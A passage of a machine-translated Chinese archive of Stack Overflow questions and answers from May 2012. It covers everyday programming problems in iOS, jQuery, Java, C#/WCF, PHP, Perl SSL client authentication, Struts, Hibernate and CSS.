然而，我已经将 Mobclix 中的分配调到了最大值。我的印象。我想在超过 90% 的请求中调用 iAD，如果他们无法提供 AD，其他网络应该会显示一些东西。

是否可以单独集成 iAD 并在每次收到错误时调用它，或者 iad 无法填充调用 mobclix 的空间。我认为这会更好，因为我可以打开 mobclix 优化。

第一个广告数据：

iAD： http: [//i.imgur.com/PLc9L.png](http://i.imgur.com/PLc9L.png?1) ? 1 Mobclix： http: [//i.imgur.com/ayzsC.png ?1](http://i.imgur.com/ayzsC.png?1)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T16:05:35.037

是的，你可以这么做。如果您想先尝试 iAd，您只需手动尝试 iAd，然后如果调用此委托函数：

```
- (void)bannerView:(ADBannerView *)banner didFailToReceiveAdWithError:(NSError *)error 
```

然后你试试 mobclix。此时您可以选择删除失败的 iAd，也可以保留它，它仍会尝试为您获取广告。如果它收到一个并触发：

```
- (void)bannerViewDidLoadAd:(ADBannerView *)banner 
```

您可以删除 mobclix 广告，以便显示 iAd。

# jquery - div的淡出时间

> ID：10603504
> 
> 赞同：1
> 
> 时间：2012-05-15T14:59:42.753
> 
> 标签：jquery, fadeout

我在我的网站中使用fadeOut 作为一个div。

```
$(window).load(function(){
    $("#messages").fadeOut(5000);
}); 
```

我想要这个 div 显示 5 秒显示，在淡出效果之后。

我能怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:00:52.107

您可以使用[`setTimeout()`](https://developer.mozilla.org/en/DOM/window.setTimeout)延迟代码执行。

```
setTimeout(function() { $("#messages").fadeOut() }, 5000); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:04:12.143

您可以使用 settimeout 功能。请参阅以下链接。 [https://developer.mozilla.org/en/DOM/window.setTimeout](https://developer.mozilla.org/en/DOM/window.setTimeout)

# java - Java中客户端上的服务器调用函数

> ID：10603505
> 
> 赞同：0
> 
> 时间：2012-05-15T14:59:46.700
> 
> 标签：java, comet

我有一个网络应用程序。我需要 Web 应用程序能够调用客户端上的函数。假设我能够让客户端调用服务器来建立连接。

我一直在寻找不同的方法来做到这一点。一种方法是使用 [Comet Programming](http://en.wikipedia.org/wiki/Comet_%28programming%29)我真的希望服务器能够直接调用方法而不是发送消息。

是否有内置的 Java 方法可以做到这一点？或者还有其他方法可以实现吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:04:26.433

GWT（谷歌网络工具包）可以做到这一点，检查：

[http://code.google.com/p/google-web-toolkit-incubator/wiki/ServerPushFAQ](http://code.google.com/p/google-web-toolkit-incubator/wiki/ServerPushFAQ)

但我从不使用这个。我总是做从客户端到服务器的池化

```
while(true){
   resp = ask_for_something();
   if (resp.has_something_to_do) { do_something(/* resp.action_or_etc */); }
   sleep(SLEEPTIME);
} 
```

但在 javascript 上下文中，您可以使用 setInterval 和 ajax 超时

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:02:04.547

听起来 Java RMI 可能正是您正在寻找的。

阅读[官方文档](http://www.oracle.com/technetwork/java/javase/tech/index-jsp-136424.html)。

# c# - WPF：绑定到目录

> ID：10603506
> 
> 赞同：3
> 
> 时间：2012-05-15T14:59:48.683
> 
> 标签：c#, wpf, xaml, data-binding

是否有一个绑定的`ListBox`例子，例如，一个目录？我猜这将涉及实际绑定到涉及的内容`FileSystemWatcher`，以便相应地`ListBox`更新。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T15:05:07.057

我不知道您可以绑定到目录。但是，您可以绑定到 an`ObserveableCollection`然后使用`FileSystemWatcher`的事件来更新 that `ObserveableCollection`，这反过来会更新您的列表框。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T15:05:07.103

如果您使用的是 .NET 4，则可以使用新的[Directory.EnumurateFiles](http://msdn.microsoft.com/en-us/library/dd383571.aspx)。

当它返回 IEnumerable 时，您可能需要用 ObservableCollection 将其包装起来以使其对 WPF MVVM 友好

# java - Android - 帮助我使用 NodeList

> ID：10603514
> 
> 赞同：3
> 
> 时间：2012-05-15T15:00:11.193
> 
> 标签：java, android, xml-parsing

我这里有问题。我想测试我的解析器结果。

我有一个从请求到谷歌地图的 kml 文件。这是我的 KML 文档

```
<LineString>
    <coordinates>
        106.826200,-6.297500,0.000000 
        106.826220,-6.297260,0.000000 
        106.826380,-6.297050,0.000000 
        106.826900,-6.296710,0.000000 
        106.827120,-6.296640,0.000000 
        106.827120,-6.296640,0.000000 
        106.827170,-6.296510,0.000000 
        106.827140,-6.296370,0.000000 
        106.827140,-6.296370,0.000000 
        106.826210,-6.295840,0.000000 
        106.824970,-6.295220,0.000000 
        106.823550,-6.294580,0.000000 
        106.822690,-6.293830,0.000000 
        106.822860,-6.293800,0.000000 
        106.823820,-6.294160,0.000000 
        106.825240,-6.294830,0.000000 
        106.830400,-6.297550,0.000000 
        106.831360,-6.298100,0.000000 
        106.885600,-6.293860,0.000000 
    </coordinates>
</LineString> 
```

这是我的代码：

```
NodeList nl = doc.getElementsByTagName("LineString");
        for(int s = 0; s < nl.getLength(); s++){
            Node rootNode = nl.item(s);
            NodeList configItems = rootNode.getChildNodes();
            for(int x = 0; x < configItems.getLength(); x++){
                Node lineStringNode = configItems.item(x);
                NodeList path = lineStringNode.getChildNodes();
                pathConent = path.item(0).getNodeValue();
            }
        } 
```

解析器成功，我可以在谷歌地图上绘制路线。但现在我想知道它是如何工作的，所以我想将坐标打印到 TextView。这是我的新代码：

```
NodeList nl = doc.getElementsByTagName("LineString");
        for(int s = 0; s < nl.getLength(); s++){
            Node rootNode = nl.item(s);
            NodeList configItems = rootNode.getChildNodes();
            for(int x = 0; x < configItems.getLength(); x++){
                Node lineStringNode = configItems.item(x);
                NodeList path = lineStringNode.getChildNodes();
                pathConent = path.item(0).getNodeValue();
            }
        }
    String[] tempContent = pathConent.split(" ");
            for (int i = 0; i < tempContent.length; i++){
                koor.setText("Latitude, Longitude:\n" + tempContent[i] + "\n");
            } 
```

但是为什么在我的 TextView 中我只有第一个坐标（106.826200，-6.297500,0.000000）。你能帮我解决我的问题吗？

谢谢，我真的很抱歉我的英语>_<

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:31:26.103

采用

```
 String[] tempContent = pathConent.split(" ");
    koor.setText("");
    for (int i = 0; i < tempContent.length; i++){
        koor.append("Latitude, Longitude:\n" + tempContent[i] + "\n");
    } 
```

代替

```
String[] tempContent = pathConent.split(" ");
        for (int i = 0; i < tempContent.length; i++){
            koor.setText("Latitude, Longitude:\n" + tempContent[i] + "\n");
        } 
```

# wcf - 升级到 WCF 数据服务 5.0 后缺少 Content-Type 标头值

> ID：10603516
> 
> 赞同：0
> 
> 时间：2012-05-15T15:00:21.053
> 
> 标签：wcf, wcf-data-services

升级到 OData V3 的 WCF 数据服务 5.0 后，我无法进行插入或更新。唯一可能的就是选择。

**编辑**

**重写方法 HandleException 中的异常：**

异常：System.Data.Services.DataServiceException：缺少 Content-Type 标头值。在 System.Data.Services.HttpProcessUtility.ReadContentType(String contentType, String& mime, Encoding& encoding) 在 System.Data. Services.DataService `1.HandlePostOperation(RequestDescription description, IDataService dataService) at System.Data.Services.DataService`1.ProcessIncomingRequest(RequestDescription description, IDataService dataService) 在 System.Data.Services.DataService `1.HandleNonBatchRequest(RequestDescription description) at System.Data.Services.DataService`1.HandleRequest()

响应状态代码：400

**客户端代码** 我在 HTTP-Request-Header 中设置了一个令牌...

```
 /// <summary>
    /// Initializes a new instance of the <see cref="ServiceBase"/> class.
    /// </summary>
    /// <param name="uri">service uri</param>
    protected ServiceBase(Uri uri)
    {
        this.Context = new Entities(uri) { MergeOption = MergeOption.OverwriteChanges };
        this.Context.SendingRequest += new EventHandler<SendingRequestEventArgs>(this.ContextSendingRequest);
    }

    /// <summary>
    /// OnSendingRequest
    /// </summary>
    /// <param name="sender">source</param>
    /// <param name="e">event args</param>
    private void ContextSendingRequest(object sender, SendingRequestEventArgs e)
    {
        e.RequestHeaders["token"] = "xyassdfdfdfdf";
    } 
```

**Service-Code：** Service解析这个Header并检查token

```
 public XYDataService()
    {
        this.ProcessingPipeline.ProcessingRequest += this.ProcessingPipelineProcessingRequest;
    }

    /// <summary>
    /// OnProcessingRequest
    /// </summary>
    /// <param name="sender">source</param>
    /// <param name="e">event args</param>
    private void ProcessingPipelineProcessingRequest(object sender, DataServiceProcessingPipelineEventArgs e)
    {
        var authHeader = HttpContext.Current.Request.Headers["token"];

        if (string.IsNullOrEmpty(authHeader) || !authHeader.Equals("xyassdfdfdfdf"))
        {
            throw new DataServiceException(401, "401 Unauthorized");
        }
    } 
```

谢谢你的帮助。

和我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T08:46:57.007

使用答案，因为我需要在这里放置更多文字。

我尝试了与您的代码非常相似的代码，但效果很好：

```
DemoService ctx = new DemoService(new Uri("http://services.odata.org/(S(jcemln1vp0u1gqtoyqqpwrc1))/OData/OData.svc/"));
ctx.UsePostTunneling = true;
ctx.SendingRequest += (sender, ea) => { ea.RequestHeaders["token"] = "value"; };

ctx.UpdateObject(ctx.Products.First());
ctx.SaveChanges(); 
```

使用来自 NuGet 的最新 WCF DS 5.0 位运行它可以工作。我还向 Fiddler 验证了它确实发送了 Content-Type 标头。

另一方面，您的请求没有 Content-Type 标头。您能否确认您使用的是最新的 NuGet 包，并且您在上面发布的代码确实是您正在测试的代码？

# java - 带有 \0 的字符串在 Java 中的行为很奇怪

> ID：10603518
> 
> 赞同：2
> 
> 时间：2012-05-15T15:00:27.367
> 
> 标签：java, string, null-terminated

为什么 a 与 b 不同？

```
 String a = "BuildGUID10035\0528\0440";
    String b = "BuildGUID10035" + '\0' + 528  + '\0' + 440;

    System.out.println("A: " + a);
    System.out.println("B: " + b);
    System.out.println(a.equals(b)); 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-15T15:01:50.163

它们是不同的，因为在第一个字符串中，`\052`被解释为单个八进制转义序列（也是如此`\044`）。

以下两个字符串确实比较相等：

```
String a = "BuildGUID10035\000528\000440";
String b = "BuildGUID10035" + '\0' + 528  + '\0' + 440; 
```

（我已经`\0`用`\000`in替换了`a`。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T15:11:39.597

\052 和 \044 是字符的八进制表示。以 \ 和三个数字开头的任何内容都被视为字符的八进制形式。因此，两个字符串不相等。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T16:17:05.430

\ 后跟 3 位数字表示八进制转义序列。因此，字符串 a 变为 BuildGUID10035*8$0 an 因此不等于字符串 b。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-15T15:04:15.880

\0 是空字符的占位符。所以第一个字符串被解释为 \052 ... \044 其中第二个是 BuildGUID10035{NULL}528{NULL}440

（显然我用 NULL 作为我的意思的一个例子......）

\052 和 \044 将被单独解释

# java - Glassfish Web 部署后执行代码

> ID：10603521
> 
> 赞同：1
> 
> 时间：2012-05-15T15:00:31.223
> 
> 标签：java, web-services, deployment, glassfish, web-deployment

我正在尝试在 Glassfish 上运行 Java Web 服务。有一些初始化代码设置一些变量并从 Glassfish 环境本身检索一些信息。我在@WebService 类中的静态初始化程序中有该代码，但是该代码似乎调用得太早了，它在部署 WebService 端点后立即运行，而我需要它在整个 Web 服务成功部署后运行.

我尝试将代码移动到 WebService 类的构造函数中，但是只有当我进入 Tester 网页并发送一些数据以使 Web 方法运行时，该代码才运行。

有没有办法设置一些初始化代码，以便在整个 Web 服务部署完成后立即运行？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T16:12:16.663

**选项 1：**在 Glassfish 中，您拥有[生命周期模块](http://docs.oracle.com/cd/E19798-01/821-1751/giury/index.html)

**选项 2：** 您还可以编写[ServletContextListener](http://docs.oracle.com/javaee/6/api/javax/servlet/ServletContextListener.html)以在加载上下文时触发：

```
public class MyServlet implements ServletContextListener {

  public void contextInitialized(ServletContextEvent e) {
         // implementation code
  }

  public void contextDestroyed(ServletContextEvent e) {
         // implementation code
  }
} 
```

参考：

*   [关于生命周期模块](http://docs.oracle.com/cd/E18930_01/html/821-2416/giuxo.html)
*   [ServletContextListener 示例](http://www.javabeat.net/2009/02/servletcontextlistener-example/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:08:44.510

是的@Jaynathan Leung，您可以使用soapUI 部署Web 服务并使用输入和输出数据测试您的编程。我希望能帮助你。:)

# objective-c - 在 Xcode 中，使按钮看起来像文本字段或文本字段看起来像按钮

> ID：10603525
> 
> 赞同：1
> 
> 时间：2012-05-15T15:00:55.517
> 
> 标签：objective-c, ios, xcode

在 Xcode (iOS) 中，我有一个包含按钮和文本字段组合的屏幕。但是，它们看起来不同。有没有办法让按钮看起来像一个文本字段？或者有没有一种方法可以让文本字段像按钮一样（按下时执行一些操作并且不调出键盘）？

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T15:05:06.630

您可以尝试以下方法之一：

*   在文本字段顶部放置一个透明（没有图像的自定义）按钮并将所需的操作附加到它
*   `textFieldShouldBeginEditing:` `UITextFieldDelegate`在协议方法的实现中展示你的观点

子类化也是一种选择，但它可能会使您的任务过于复杂。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T15:40:49.443

如果你想执行一个动作并且按下时不调出键盘`UITextField`你可以这样做：

```
-(BOOL)textFieldShouldBeginEditing:(UITextField *)textField {

    // do here everything you want
    NSLog(@"Pressed on TextField!");

    [self.view endEditing:YES]; // Hide keyboard

    return NO;
} 
```

每次在 textField 上按下时都会调用此函数。

** 不要忘记**委托** `UITextField`。

注意：有了这个你会遇到问题：如果键盘显示它不会隐藏，所以你还需要添加`-endEditing:YES`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:07:24.013

您需要自定义其中一个......或两者兼而有之

示例：创建一个类 CustomTextField：UITextField

在这个类中使用：

```
 #import <QuartzCore/QuartzCore.h> 
```

玩出风格

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-08-18T18:59:06.267

迟到的答案，但尽管如此。我这样做是为了让 UIButton 看起来像 UITextField

```
@property (weak, nonatomic) IBOutlet UIButton *resolutionButton; 
```

在 viewDidLoad 中：

```
dispatch_async(dispatch_get_main_queue(), ^{
    [[self.resolutionButton layer] setBorderColor: [UIColor colorWithWhite:0.6f alpha:0.6f].CGColor];
    self.resolutionButton.layer.cornerRadius = 5.0f;
    self.resolutionButton.layer.borderWidth = 0.5f;
} 
```

# php - 如何从PHP中字符串的开头和结尾删除尾随空格和“”？

> ID：10603527
> 
> 赞同：3
> 
> 时间：2012-05-15T15:00:56.327
> 
> 标签：php, whitespace, trim

如果

```
$text = '    &nbsp;    &nbsp; MEANINGFUL THINGS GO HERE &nbsp;&nbsp;     &nbsp;'; 
```

我怎样才能得到

```
$cleanText = 'MEANINGFUL THINGS GO HERE'; 
```

我知道以下将删除所有空格

```
$text=trim($text); 
```

但是如何将实际的逃逸空间也纳入装饰中呢？

`Meaningful Things`可以包含`[shortcodes]`, html 标签，也可以包含转义字符。我需要保存这些。

任何帮助，将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-15T15:08:00.967

```
$text = '    &nbsp;    &nbsp; MEANINGFUL THINGS GO HERE &nbsp;&nbsp;     &nbsp;';

$text = preg_replace( "#(^(&nbsp;|\s)+|(&nbsp;|\s)+$)#", "", $text );

var_dump( $text );

//string(25) "MEANINGFUL THINGS GO HERE" 
```

附加测试

```
$text = '    &nbsp;  S  &nbsp;&nbsp;&nbsp;  S   &nbsp;';
-->
string(24) "S  &nbsp;&nbsp;&nbsp;  S"

$text = '    &nbsp;    &nbsp;&nbsp;&nbsp;     &nbsp;';
-->
string(0) ""

$text = '    &nbsp;    &nbst;&nbsp;&nbst;     &nbsp;';
-->
string(18) "&nbst;&nbsp;&nbst;" 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T15:01:56.220

还对此运行[html_entity_decode](http://php.net/manual/en/function.html-entity-decode.php)，然后修剪：

```
$text=trim(html_entity_decode($text)); 
```

# php - 表格中的文本区域

> ID：10603531
> 
> 赞同：0
> 
> 时间：2012-05-15T15:01:11.770
> 
> 标签：php, textarea

请告诉我如何在 td 表中隐藏 textarea，我必须使用什么属性？

```
<td class='odd text'><textarea placeholder='Start time' ></textarea>  </td> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:02:53.780

与隐藏其他任何内容相同：`style="display:none"`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:04:26.103

似乎在这个问题中有表格没有任何区别。要使 textarea 隐藏，请`display:none`像这样设置样式属性：

```
<td class='odd text'><textarea placeholder='Start time' style="display:none" ></textarea>  </td> 
```

# struts2 - Struts 1 Action 重定向到 Struts 2 Action

> ID：10603538
> 
> 赞同：1
> 
> 时间：2012-05-15T15:02:03.127
> 
> 标签：struts2, struts-1

我有一个包含 struts 1 和 struts 2 的 java webapp。在应用程序内部有几个 Struts 2 命名空间和 Struts 1 模块。例如：

```
/public (Struts 1 module)
/accounting (Struts 2 namespace)
/auditing (Struts 2 namespace)
/receipts (Struts 1 modules) 
```

在我的 web.xml 中，Struts 1 和 2 过滤器专门映射到正确的命名空间/模块。例如，

```
<filter-mapping>
    <filter-name>struts2</filter-name>
    <url-pattern>/accounting/*</url-pattern>
</filter-mapping>

<filter-mapping>
    <filter-name>struts1</filter-name>
    <url-pattern>/public/*</url-pattern>
</filter-mapping> 
```

在我的 Struts 1 区域内，我请求将 Struts 1 动作转发到 Struts 2 动作。我尝试了以下方法：

```
<action path="/myRedirect" forward="/checkAccountRecords.action" module="accounting" /> 
```

但是，这会导致以下堆栈跟踪：

```
The Struts dispatcher cannot be found.  This is usually caused by using Struts tags without the associated filter. Struts tags are only usable when the request has passed through its servlet filter, which initializes the Struts dispatcher needed for this tag. - [unknown location] 
```

我知道这可以通过通过 Struts 2 过滤器映射网站的 Struts 1 部分来解决，但这会给我们的特定网站带来问题，我想避免这样做。

我还尝试了没有模块的操作：

```
<action path="/myRedirect" forward="/accounting/checkAccountRecords.action" /> 
```

我收到以下错误：

```
can't find /receipts/accounting/checkAccountRecords.action (file not found) 
```

我还尝试了以下动作映射：

```
<action path="/myRedirect" forward="../accounting/checkAccountRecords.action" /> 
```

我收到以下错误：

```
Path ../accounting/checkAccountRecords.action does not start with a "/" character 
```

那么还有什么我可以尝试的吗？如何获得 Struts 1 操作以将重定向返回到 Struts 2 操作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T15:57:53.303

作为一种解决方法，在我的`Struts`操作中，我手动修改了`response.sendRedirect`将用户发送到正确的页面，而不是将其映射到`struts.xml`文件中。

# java - 分割音频信号

> ID：10603542
> 
> 赞同：2
> 
> 时间：2012-05-15T15:02:21.763
> 
> 标签：java, algorithm, audio, signal-processing

我有一个音频信号输入作为双精度数组。我想通过将其分割成 25 毫秒的汉明窗口分析帧来制作该信号的帧，重叠率为 50%。我有计算汉明窗的代码。有人可以告诉我如何将音频信号分割成帧吗？首选伪代码或 Java 代码。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T16:52:03.897

伪代码：

```
Fs = 44100;                // sample rate, e.g. 44.1 kHz
overlap = 0.5;             // overlap = 50%
nw = Fs * 0.025;           // no of samples in window
ns = nw * (1.0 - overlap); // no of samples to increment n0, n1
n0 = 0;                    // window sample no begin
n1 = n0 + nw;              // window sample no end
N = 10 * Fs;               // N = total no of samples to process, e.g. 10 seconds

do
    get nw samples from n0 to (n1 - 1) into temporary buffer
    apply window function to temporary buffer
    apply FFT to temporary buffer
    ... etc ...
    n0 += ns; // increment window start/end by no of overlap samples
    n1 += ns;
while n1 <= N; 
```

# perl - 使用证书的 Perl ssl 客户端身份验证

> ID：10603543
> 
> 赞同：4
> 
> 时间：2012-05-15T15:02:22.403
> 
> 标签：perl

我无法使以下代码正常工作并且遇到困难。我正在尝试在 POST 请求期间使用证书执行客户端身份验证。我只对将客户端证书发送到服务器感兴趣，并不需要检查服务器证书。

这是尝试复制的 cUrl 命令：

curl --cacert caCertificate.pem --cert clientCertificate.pem -d "string" [https://xx.xx.xx.xx:8443/postRf](https://xx.xx.xx.xx:8443/postRf)

我的 Perl 脚本中不断出现以下错误： ssl handshake failure

我猜我有两个问题：对于 CRT7 和 KEY8 变量，我应该指向什么？这是使用客户端证书身份验证发送 POST 请求的最佳方式吗？

```
!/usr/bin/perl
use warnings;
use strict;
use Net::SSLeay qw(post_https);

my $$hostIp = "xx.xx.xx.xx" 
my $hostPort = "8443" 
my $postCommand = "/postRf/string";
my $http_method = 'plain/text';
my $path_to_crt7 = 'pathToCert.pem';
my $path_to_key8 = 'pathToKey.pem';

my ($page, $response, %reply_headers) =
        post_https($hostIp, $hostPort, $postCommand, '',
        $http_method, $path_to_crt7, $path_to_key8
);

print $page . "\n";
print $response . "\n"; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T19:58:31.700

请参阅[LWP::UserAgent](http://p3rl.org/LWP%3a%3aUserAgent)和[IO::Socket::SSL](http://p3rl.org/IO%3a%3aSocket%3a%3aSSL)。

```
use strictures;
use LWP::UserAgent qw();
require LWP::Protocol::https;

my $ua = LWP::UserAgent->new;
$ua->ssl_opts(
    SSL_ca_file   => 'caCertificate.pem',
    SSL_cert_file => 'clientCerticate.pem',
);
$ua->post(
    'https://xx.xx.xx.xx:8443/postRf',
    Content => 'string',
); 
```

我没有测试过这段代码。

# file - 使用经典 ASP 将文件附加到 Access 数据库

> ID：10603546
> 
> 赞同：1
> 
> 时间：2012-05-15T15:02:24.073
> 
> 标签：file, ms-access, asp-classic, attachment

我有一个包含一些文本字段和一个附件（type="file"）的表单。我正在使用 MS Access 2010。当我尝试将表单数据插入数据库时​​，出现错误，如 INSERT INTO 查询不能包含多值字段。我尝试了很多并搜索了很多，但我无法弄清楚。我可以使用 asp.net 来做到这一点。但是，我的服务器只支持经典的 asp。任何人都可以对此有任何想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T13:34:30.307

我不相信您可以使用 ADO 来使用 MS Access 附件字段。我相信你需要使用 DAO 或 ADO.Net。而且我不认为 DAO 或 ADO.net 在 Classic ASP 中可用。

编辑：我同意 Hansup 的观点，您可以在 VBScrip/Classic ASP 中使用 DAO，但我发现很难找到任何信息或示例。这是一个常量列表，但这是针对旧版本的 DAO。[http://include.wutils.com/com-dll/constants/constants-DAO.htm](http://include.wutils.com/com-dll/constants/constants-DAO.htm)

# c# - Asp.Net 应用程序在初始加载时加载缓慢

> ID：10603548
> 
> 赞同：1
> 
> 时间：2012-05-15T15:02:26.547
> 
> 标签：c#, asp.net, asp.net-mvc-3, iis-7

我有一个 ASP.NET 应用程序，它最初需要更多时间来加载。第一次加载后，页面加载速度更快。

我的页面有一个图片库。此图库是根据类别选择加载的。这是由 ajax 完成的。当我单击特定类别时，它将通过 ajax 加载图库。但问题是第一个加载类别的 Ajax 请求将花费更多时间。第二次我们尝试访问相同的类别，它会加载得更快。

我没有启用服务器端和客户端缓存。幕后究竟发生了什么？我想当我第一次尝试从磁盘读取文件时，它会缓存在内存中，第二次它会从内存中给出。我的假设是真的吗？所以我的问题是：

1.Os会不会对文件读操作进行磁盘缓存？

2.如果不是这样，第一次打开时会出现什么问题？

3.如何解决这个问题？是否有任何 IIS 设置或页面级别？

请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:09:37.117

尝试将预编译的解决方案部署到服务器：

[http://msdn.microsoft.com/en-us/library/ms228015(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/ms228015(v=vs.85).aspx)

# google-app-engine - ListDataModel 不可序列化==不会在 GAE 上运行

> ID：10603551
> 
> 赞同：1
> 
> 时间：2012-05-15T15:02:31.830
> 
> 标签：google-app-engine, jsf, jsf-2

好的，所以我现在真的被困住了。我有 ah:datatable，获取行详细信息的唯一方法似乎是 DataModel#getRowData()。不幸的是，包装必要数据所需的 ListDataModel 不可序列化，因此不适用于 GAE，我真的需要它来工作！有没有人对任何解决方法或使其发挥作用的某种方法有任何想法。非常感谢帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:07:49.333

标记该属性`transient`（以便在序列化期间跳过它）并在 getter 中引入延迟加载。

例如

```
private List<Item> itemList;
private transient DataModel<Item> itemModel;

public DataModel<Item> getItemModel() {
    if (itemModel == null) {
        itemModel = new ListDataModel<Item>(itemList);
    }

    return itemModel;
} 
```

顺便说一下，检索当前行的替代方法。另请参阅[如何将选定的行传递给 dataTable 中的 commandLink？](https://stackoverflow.com/questions/4994458/how-can-i-pass-a-parameter-to-a-commandlink-inside-a-datatable)

# css - CSS：换行符忽略填充？

> ID：10603552
> 
> 赞同：17
> 
> 时间：2012-05-15T15:02:39.770
> 
> 标签：css

我不知道为什么会这样……</p>

```
<div class="inner">
    <em class="wrapper tiny">Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et </em>
</div> 
```

`.inner`应用了简单的左右边距。标签应用了`em.wrapper`填充。

我不知道为什么浏览器宽度自动打破的第二行忽略了`.wrapper`框的填充？

有什么想法吗？

![在此处输入图像描述](../Images/ff49ebbde3b22cdb443871bfc00c3f0b.png)

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2012-05-15T15:06:10.707

`em`标签是`display: inline`默认的。尝试添加`display: inline-block`到类定义。

```
.wrapper {
  /* ... */
  display: inline-block;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:17:33.223

您的填充设置为 0

```
padding: 0 0.75em 
```

表示 padding top 和 padding bottom 为 0px，padding left 和 padding right 为 0.75em。

将该行 CSS 更新为：

```
padding : 0.75em 
```

# c# - Response.End() 与 HttpContext.Current.ApplicationInstance.CompleteRequest()

> ID：10603553
> 
> 赞同：7
> 
> 时间：2012-05-15T15:02:41.720
> 
> 标签：c#

我们应用程序的用户在一天中至少每两秒钟下载一次附件。

以前的场景：

在用户下载附件后，我们使用 Response.End() 中止与客户端的连接。当我们遇到性能问题时，我们开始记录异常，其中最重复的一个是线程中止异常。由于我们从 Web 服务获取附件，因此我们必须进行一些清理，并且我们在 try-catch-finally 块中进行了清理。经过一番研究，我了解到 Response.End() 之后的任何代码即使在 finally 块中也不会被执行。是对的吗？

当前场景：

我已经阅读了堆栈溢出中有关 Response.End() 有害的线程，并且仅在真正需要时才需要使用它，因此我决定改用 HttpContext....CompleteRequest() 。使用此代码，完成了所需的清理工作，但呈现的 html 被附加到下载的附件中。我尝试覆盖同一篇文章中建议的 Render 和 RaisePostBackEvent，但问题仍然存在。有关如何解决此问题的任何想法都会有所帮助。

代码：

```
HttpContext.Current.Response.Clear();

Response.ClearContent();

Response.ClearHeaders();

Response.AddHeader("Content-Disposition", "attachment; filename=" +   
filename);
Response.AddHeader("Content-Length", fileContent.Length.ToString());
Response.ContentType = "application/octet-stream";
Response.BinaryWrite(fileContent);
Response.Flush(); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-15T15:35:14.437

`Response.End`内部抛出`ThreadAbortException`杀死请求 - 如果您需要进行某种清理，这需要在调用*之前*`Response.End`完成。

`Response.Redirect`并且`Response.End`不要与 try / catch 块很好地交互。因此，在您的情况下，您应该在 try / catch 中将所有逻辑写入响应流，然后`Response.End`在 finally 块之后简单地调用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-07T09:58:30.347

老 Q，不确定它是否有帮助，但在创建 PDF 文件以交付给浏览器时，我的做法与您的示例基本相同。但是，在处理结束时，我有以下内容：

```
 Response.OutputStream.Flush()
    Response.OutputStream.Close()
    Response.End() 
```

添加 .Close() 基本上。似乎在生产中工作正常。

Ed：我也发现了这个，提到 Close(): [Is Response.End() 被认为是有害的？](https://stackoverflow.com/questions/1087777/is-response-end-considered-harmful)

解决问题的另一种方法是简单地覆盖 Page_PreRender() 并将内容交付代码放在那里（这在功能上是有意义的）。那么你肯定不会得到任何不需要的 HTML，而且根本不需要 Response.End()。

# hibernate - Hibernate Annotation双向关系级联删除非空外键

> ID：10603554
> 
> 赞同：1
> 
> 时间：2012-05-15T15:02:45.140
> 
> 标签：hibernate, cascade, cascading-deletes, bidirectional, notnull

当对订单（父级）执行删除时，休眠尝试级联删除子级。它不是首先删除子项，而是尝试使外键无效，然后删除父项，然后删除子项。

有没有办法更改我的配置以允许先删除子项，然后删除父项？绕过取消外键的步骤？

## 表格和相关列

**命令**

id - PK，整数，不为空

**订单结果**

id - PK，int，非空 order_id - FK，int，非空

## 实体规范

**命令**

```
@OneToMany(cascade = CascadeType.ALL, orphanRemoval = true)
@JoinColumn(name = "CLOrderID")
public List<OrderResult> getOrderResults() {
    return orderResults;
} 
```

**订单结果**

```
@ManyToOne
@JoinColumn(name = "CLOrderID", nullable = false)
public Order getOrder() {
    return order;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T09:54:24.663

您的代码的问题是 Cascade DELETE 设置正确。这就是为什么当您删除用户时，DELETE 操作不会级联，即，也删除 OrderResult。相反，它通过将引用值设置为 NULL 来更新 OrderResult，因为 Order 已被删除。

要修复它，请更改您的`Order`课程：

```
@OneToMany(cascade = CascadeType.ALL, mappedBy="order")
public List<OrderResult> getOrderResults() {
    return orderResults;
} 
```

希望它有所帮助。

# spring - 用于文件处理的 Spring Batch

> ID：10603555
> 
> 赞同：1
> 
> 时间：2012-05-15T15:02:53.203
> 
> 标签：spring, spring-batch

Spring Batch 是否适合处理大量单个文件？

